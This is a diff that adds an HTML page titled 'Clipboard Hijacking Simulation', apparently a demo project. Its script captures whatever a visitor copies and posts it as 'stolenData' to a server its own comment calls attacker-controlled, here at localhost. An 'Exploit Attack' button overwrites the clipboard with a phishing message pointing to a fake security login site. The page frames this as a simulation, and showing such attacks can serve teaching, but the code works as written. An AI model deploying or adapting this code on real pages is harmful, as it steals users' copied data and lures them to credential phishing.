@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clipboard Hijacking Module</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        /* Global Styling */
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(to right, #141e30, #243b55);
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        /* Main Heading */
+        h1 {
+            font-size: 32px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        /* Wrapper for Equal-Sized Boxes */
+        .wrapper {
+            display: flex;
+            width: 80%;
+            max-width: 900px;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* Equal-Sized Sections */
+        .section {
+            width: 48%;
+            padding: 20px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+
+        /* Textarea Styling */
+        textarea {
+            width: 100%;
+            height: 150px;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            resize: none;
+            outline: none;
+        }
+
+        textarea:focus {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        /* Button Styling */
+        .btn {
+            width: 80%;
+            padding: 12px;
+            font-size: 18px;
+            color: white;
+            background: #ff5757;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s ease-in-out;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background: #ff3030;
+        }
+    </style>
+</head>
+<body>
+    <h1>Clipboard Hijacking Simulation</h1>
+
+    <div class="wrapper">
+        <!-- Left Side: Copy Section -->
+        <div class="section">
+            <h2>Copy Side</h2>
+            <textarea id="copyBox" placeholder="Type and copy text..."></textarea>
+            <button class="btn" onclick="triggerExploit()">Exploit Attack</button>
+        </div>
+
+        <!-- Right Side: Paste Section -->
+        <div class="section">
+            <h2>Paste Side</h2>
+            <textarea id="pasteBox" placeholder="Paste copied text here..."></textarea>
+        </div>
+    </div>
+
+    <script>
+        let originalClipboardData = "";
+        let isExploitActive = false;
+
+        // Hijack clipboard data when copied (no modification initially)
+        document.addEventListener("copy", (event) => {
+            originalClipboardData = window.getSelection().toString();
+            console.log("📌 Hijacked Clipboard Data:", originalClipboardData);
+
+            // Send clipboard data to attacker-controlled server
+            fetch("http://localhost:3000/hijack", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ stolenData: originalClipboardData }),
+            }).then(() => {
+                console.log("✅ Data sent to server!");
+            }).catch((error) => {
+                console.error("❌ Failed to send data:", error);
+            });
+
+            event.preventDefault(); // Prevent default clipboard behavior
+        });
+
+        // Modify clipboard data when exploit button is clicked
+        function triggerExploit() {
+            isExploitActive = true;
+            let maliciousPayload = "⚠️ WARNING: Your system has been flagged!\nVisit http://fake-security-login.com to verify your identity.";
+
+            navigator.clipboard.writeText(maliciousPayload).then(() => {
+                console.log("⚠️ Exploit executed! Clipboard data modified.");
+                alert("Exploit triggered! Your copied data has been replaced.");
+            }).catch(err => {
+                console.error("❌ Exploit failed:", err);
+            });
+        }
+
+        document.getElementById("pasteBox").addEventListener("input", () => {
+    let pastedText = document.getElementById("pasteBox").value;
+
+    // Ensure original clipboard data pastes correctly BEFORE exploit
+    if (!isExploitActive) {
+        document.getElementById("pasteBox").value = originalClipboardData;
+    } else {
+        navigator.clipboard.readText().then(text => {
+            document.getElementById("pasteBox").value = text; // Apply modified clipboard data
+        }).catch(err => {
+            console.error("❌ Failed to read clipboard data:", err);
+        });
+    }
+});
+
+    </script>
+</body>
+</html>
